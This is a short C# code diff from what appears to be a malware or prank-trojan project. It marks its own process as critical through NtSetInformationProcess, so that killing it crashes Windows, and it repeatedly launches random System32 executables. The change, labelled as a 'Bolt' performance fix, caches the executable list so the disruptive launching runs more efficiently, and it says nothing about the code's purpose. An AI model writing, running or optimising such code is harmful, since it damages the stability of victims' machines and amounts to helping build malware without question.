@@ -778,16 +778,21 @@ namespace Hiphenatus
             IntPtr handle = Process.GetCurrentProcess().Handle;
             NtSetInformationProcess(handle, 0x1D, ref isCritical, sizeof(int));
         }
+        // ⚡ Bolt: Cache expensive Directory.GetFiles result to avoid hitting the disk every 2 seconds
+        private static string[] cachedExeFiles = null;
         public static void randEXE()
         {
             // Open a random exe file from system32
-            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
+            if (cachedExeFiles == null)
+            {
+                cachedExeFiles = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
+            }
             Random random = new Random();
             for (int i = 0; i < 5; i++)
             {
                 try
                 {
-                    Process.Start(files[random.Next(files.Length)]);
+                    Process.Start(cachedExeFiles[random.Next(cachedExeFiles.Length)]);
                 }
                 catch (Exception) { }
             }
